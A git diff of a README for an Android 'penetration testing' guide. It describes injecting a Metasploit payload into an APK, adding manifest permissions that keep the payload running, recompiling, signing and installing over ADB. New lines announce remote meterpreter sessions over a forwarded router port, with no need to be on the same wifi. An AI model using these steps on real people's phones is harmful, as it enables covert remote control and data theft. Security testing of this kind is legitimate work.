@@ -2,11 +2,16 @@
 [![github-banner.jpg](https://i.postimg.cc/sxhdzJLF/github-banner.jpg)](https://postimg.cc/n9pwYqZT)
 # Android Penetration Testing Workflow: APK Modification & Local Deployment Guide:
 
-This repository documents the technical process of injecting a Metasploit payload into an Android application package (APK), engineering the manifest to allow explicit execution, cryptographically signing the binary, and deploying it locally via ADB for security testing.
+**Update.**
+
+**If done properly this guide now achieves fully wireless meterpreter sessions without the need to even be on the same wifi.**
+
+This repository documents the technical process of injecting a Metasploit payload into an Android application package (APK), engineering the manifest to allow explicit execution, cryptographically signing the binary, and deploying it locally via ADB for security testing. **Update this guide now achieves fully wireless meterpreter sessions without the need to even be on the same wifi if done properly.
 
 ## Prerequisites
 
-Ensure you have the following tools installed and available in your system path:
+Ensure you have the following tools installed and available in your system path and port forwarding set up on your wifi router:
+* **Wifi Router Port Forwarding Active** (`to your Computers Local IP [192.168...]`)
 * **Metasploit Framework** (`msfvenom`, `msfconsole`)
 * **Apktool**
 * **Zipalign**
@@ -33,21 +38,30 @@ apktool d example_folder payload_example.apk
 ```
 
 ### 2. Modify the Manifest
-cd example_folder
-nano AndroidManifest.xml and add these permissions:
-   ```
-    <uses-permission android:name="android.permission.WAKE_LOCK"/>
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE"/>
-  
+```
+ cd example_folder
+```
+```  
+ nano AndroidManifest.xml
+```
+```bash
+# add these permissions to AndroidManifest.xml
+ <uses-permission android:name="android.permission.WAKE_LOCK"/>
+ <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+ <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE"/>  
   ```
-ctrl + o then ENTER to save, ctrl + x to exit.
+  ctrl + o then ENTER to save, ctrl + x to exit.
 
 ### 3. Recompile the APK
 ```bash
+# go back one directory
 cd ..
+```
+```bash
+# then recompile the apk
 apktool b example_folder payload_example.apk
 ```
+
 ---
 
 ## Step 3: Cryptographic Signing
